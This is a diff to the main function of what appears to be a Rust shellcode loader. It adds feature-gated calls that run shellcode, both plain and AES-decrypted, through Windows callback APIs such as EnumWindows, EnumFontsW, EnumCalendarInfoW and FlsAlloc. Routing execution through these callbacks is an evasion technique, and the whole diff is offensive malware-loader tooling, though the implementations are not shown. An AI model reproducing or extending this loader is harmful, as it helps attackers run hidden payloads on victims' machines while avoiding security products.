@@ -182,6 +182,45 @@ fn main() {
             
             #[cfg(feature = "ShellcodeExecuteEnumResourceTypesW")]
             execution::shellcode_execute_enumresourcetypesw(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumPageFilesW")]
+            execution::shellcode_execute_enumpagefilesw(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumDirTreeW")]
+            execution::shellcode_execute_enumdirtreew(shellcode);
+            
+            #[cfg(feature = "ShellcodeExecuteEnumFontFamiliesW")]
+            execution::shellcode_execute_enumfontfamiliesw(shellcode);
+
+            #[cfg(feature = "ShellcodeExecuteEnumDesktopsW")]
+            execution::shellcode_execute_enumdesktopsw(shellcode);
+
+            #[cfg(feature = "ShellcodeExecuteInitOnceExecuteOnce")]
+            execution::shellcode_execute_initonceexecuteonce(shellcode);
+
+            #[cfg(feature = "ShellcodeExecuteEnumThreadWindows")]
+            execution::shellcode_execute_enumthreadwindows(shellcode);
+
+            #[cfg(feature = "ShellcodeExecuteEnumerateLoadedModulesW64")]
+            execution::shellcode_execute_enumerateloadedmodulesw64(shellcode);
+
+            #[cfg(feature = "ShellcodeExecuteEnumFontsW")]
+            execution::shellcode_execute_enumfontsw(shellcode);
+
+            #[cfg(feature = "ShellcodeExecuteEnumCalendarInfoW")]
+            execution::shellcode_execute_enumcalendarinfow(shellcode);
+
+            #[cfg(feature = "ShellcodeExecuteEnumWindows")]
+            execution::shellcode_execute_enumwindows(shellcode);
+
+            #[cfg(feature = "ShellcodeExecuteEnumPwrSchemes")]
+            execution::shellcode_execute_enumpwrschemes(shellcode);
+
+            #[cfg(feature = "ShellcodeExecuteSymFindFileInPath")]
+            execution::shellcode_execute_symfindfileinpath(shellcode);
+
+            #[cfg(feature = "ShellcodeExecuteFlsAlloc")]
+            execution::shellcode_execute_flsalloc(shellcode);
         }
 
         // Execute shellcode with AES decryption
@@ -254,6 +293,45 @@ fn main() {
                 
                 #[cfg(feature = "ShellcodeExecuteEnumResourceTypesW")]
                 execution::shellcode_execute_enumresourcetypesw(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumPageFilesW")]
+                execution::shellcode_execute_enumpagefilesw(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumDirTreeW")]
+                execution::shellcode_execute_enumdirtreew(decrypted_shellcode);
+                
+                #[cfg(feature = "ShellcodeExecuteEnumFontFamiliesW")]
+                execution::shellcode_execute_enumfontfamiliesw(decrypted_shellcode);
+
+                #[cfg(feature = "ShellcodeExecuteEnumDesktopsW")]
+                execution::shellcode_execute_enumdesktopsw(decrypted_shellcode);
+
+                #[cfg(feature = "ShellcodeExecuteInitOnceExecuteOnce")]
+                execution::shellcode_execute_initonceexecuteonce(decrypted_shellcode);
+
+                #[cfg(feature = "ShellcodeExecuteEnumThreadWindows")]
+                execution::shellcode_execute_enumthreadwindows(decrypted_shellcode);
+
+                #[cfg(feature = "ShellcodeExecuteEnumerateLoadedModulesW64")]
+                execution::shellcode_execute_enumerateloadedmodulesw64(decrypted_shellcode);
+
+                #[cfg(feature = "ShellcodeExecuteEnumFontsW")]
+                execution::shellcode_execute_enumfontsw(decrypted_shellcode);
+
+                #[cfg(feature = "ShellcodeExecuteEnumCalendarInfoW")]
+                execution::shellcode_execute_enumcalendarinfow(decrypted_shellcode);
+
+                #[cfg(feature = "ShellcodeExecuteEnumWindows")]
+                execution::shellcode_execute_enumwindows(decrypted_shellcode);
+
+                #[cfg(feature = "ShellcodeExecuteEnumPwrSchemes")]
+                execution::shellcode_execute_enumpwrschemes(decrypted_shellcode);
+
+                #[cfg(feature = "ShellcodeExecuteSymFindFileInPath")]
+                execution::shellcode_execute_symfindfileinpath(decrypted_shellcode);
+
+                #[cfg(feature = "ShellcodeExecuteFlsAlloc")]
+                execution::shellcode_execute_flsalloc(decrypted_shellcode);
             }
         }
 }
